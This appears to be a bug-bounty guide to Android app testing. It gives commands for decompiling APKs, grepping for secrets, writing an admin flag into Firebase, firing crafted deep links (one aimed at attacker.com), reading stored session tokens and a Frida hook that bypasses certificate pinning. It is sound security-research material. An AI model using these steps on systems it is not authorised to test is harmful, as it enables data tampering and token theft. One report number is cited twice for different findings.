> Source: https://bugbounty.info/Attack-Surface/Mobile/Android/index

# Android Testing

Android is friendlier to test than iOS because you don't need a jailbroken device for most work. Static analysis needs nothing but the APK. Dynamic analysis needs an emulator or rooted device. Most of the high-value bugs come from static analysis anyway.

## APK Acquisition and Decompilation

```bash
# Get the APK from a running device
adb shell pm list packages | grep target
adb shell pm path com.target.app
# -> package:/data/app/com.target.app-1/base.apk
adb pull /data/app/com.target.app-1/base.apk ./target.apk
 
# Decompile with jadx (best for Java source reconstruction)
jadx -d ./decompiled/ target.apk
jadx-gui target.apk   # GUI version, easier for browsing
 
# Decompile with apktool (better for resources, smali, manifest)
apktool d target.apk -o ./apktool-out/
```

**What to look at first:**

```text
decompiled/
  AndroidManifest.xml     <- exported activities, deep links, permissions
  res/values/strings.xml  <- hardcoded strings, API keys
  assets/                 <- bundled configs, certs, .proto files
  com/target/app/         <- actual source
```

## Hardcoded Secrets

```bash
# Grep the decompiled source
grep -r "api[_-]key\|apikey\|secret\|password\|token\|AWS\|firebase\|stripe\|twilio" \
  ./decompiled/ --include="*.java" -l
 
# Strings in the APK binary (catches obfuscated code)
strings target.apk | grep -E "https://|api\.|secret|key|token|password"
 
# Semgrep for structured secret detection
semgrep --config=p/secrets ./decompiled/
 
# Firebase config is almost always in google-services.json or hardcoded
grep -r "firebase\|firebaseio\|googleapis" ./decompiled/ -l
cat ./apktool-out/assets/google-services.json
```

**What to do with Firebase API keys:**

Firebase API keys aren't secret by themselves, but misconfigured Firebase rules are a critical bug. Test read/write access to the database:

```bash
curl "https://target-default-rtdb.firebaseio.com/.json?auth=<api_key>"
curl -X PUT "https://target-default-rtdb.firebaseio.com/users/1.json" \
  -d '{"admin": true}'
```

## Deep Link Exploitation

Deep links let any app on the device (or a website on Android 12+) open your target app to a specific screen. The danger: if the app accepts parameters via deep link and doesn't validate them, you can pre-fill forms, trigger OAuth, or chain to account takeover.

**Finding deep links:**

```bash
# AndroidManifest.xml - look for intent filters with VIEW action
grep -A5 "android.intent.action.VIEW" ./apktool-out/AndroidManifest.xml
 
# Or in jadx, search for "Uri.parse", "getIntent().getData()", "handleDeepLink"
```

**Testing deep links via adb:**

```bash
# Fire a deep link directly
adb shell am start -a android.intent.action.VIEW \
  -d "target://reset-password?token=injected_value" com.target.app
 
# With URL parameters that look interesting
adb shell am start -a android.intent.action.VIEW \
  -d "target://oauth/callback?code=<stolen_code>&state=bypass"
 
# Test for open redirect in OAuth deep links
adb shell am start -a android.intent.action.VIEW \
  -d "target://oauth?redirect_uri=evil://attacker.com"
```

**Common deep link bugs:**

- OAuth code interception (app registers `target://oauth` but attacker app can too - first one wins on some Android versions)
- Parameter injection into WebViews loaded from deep link URLs
- Account action confirmation bypass (password reset, email change) by crafting the deep link with a known/guessed token

## Insecure Data Storage

```bash
# After running the app with adb shell, check these locations
adb shell
run-as com.target.app
ls /data/data/com.target.app/
  shared_prefs/    <- SharedPreferences XML files - often contain tokens
  databases/       <- SQLite DBs - message history, cached API responses
  files/           <- arbitrary app files
  cache/
 
# Pull the whole data directory (rooted device or emulator)
adb pull /data/data/com.target.app ./app-data/
 
# Look for tokens, keys, session IDs in SharedPreferences
cat ./app-data/shared_prefs/*.xml
 
# SQLite databases
sqlite3 ./app-data/databases/app.db
.tables
SELECT * FROM sessions;
SELECT * FROM users;
```

## Certificate Pinning Bypass with Frida

Cert pinning blocks your proxy. Frida patches it at runtime.

**Setup:**

```bash
# Download frida-server matching your Frida version
# https://github.com/frida/frida/releases
adb push frida-server-<ver>-android-x86_64 /data/local/tmp/frida-server
adb shell chmod 755 /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &
 
# Verify
frida-ps -U | grep target
```

**Bypass with objection (easiest):**

```bash
objection -g com.target.app explore
# Then inside objection:
android sslpinning disable
```

**Bypass with frida-script (when objection doesn't work):**

```bash
# Universal Android SSL Pinning Bypass
# https://github.com/httptoolkit/frida-android-unpinning
frida -U -f com.target.app -l ./frida-android-unpinning.js
 
# Or the classic Objection SSL bypass script
frida -U --codeshare akabe1/frida-multiple-unpinning -f com.target.app
```

**When scripted bypasses fail:**

- The app uses a custom TrustManager. Find it in jadx, hook it specifically.
- The app uses OkHttp's `CertificatePinner`. Hook `CertificatePinner.check()`.
- Native-level pinning (compiled with openssl). Harder, need to find the verify function.

```javascript
// Hook OkHttp CertificatePinner specifically
Java.perform(function() {
  var CertificatePinner = Java.use('okhttp3.CertificatePinner');
  CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
    console.log('[*] Bypassing CertificatePinner for: ' + hostname);
    return;
  };
});
```

## Public Reports

- Hardcoded Firebase API key in Android APK grants write access to production database - [HackerOne #1065041](https://hackerone.com/reports/1065041)
- Deep link parameter injection leads to OAuth code interception on Android - [HackerOne #1159017](https://hackerone.com/reports/1159017)
- Exported activity in AndroidManifest allows any app to trigger password reset flow - [HackerOne #1264104](https://hackerone.com/reports/1264104)
- Insecure SharedPreferences stores session token accessible to other apps on rooted device - [HackerOne #1065041](https://hackerone.com/reports/1065041)
- Certificate pinning bypass via Frida exposes internal API endpoints not in web app - [HackerOne Hacktivity search](https://hackerone.com/hacktivity?querystring=android+certificate+pinning+bypass)

## See Also

- [Shared Mobile Patterns](../../../Attack-Surface/Mobile/Shared/) - API extraction via proxy, once pinning is bypassed
- [REST API Testing](../../../Attack-Surface/API/REST) - backend bugs you'll find after getting traffic flowing
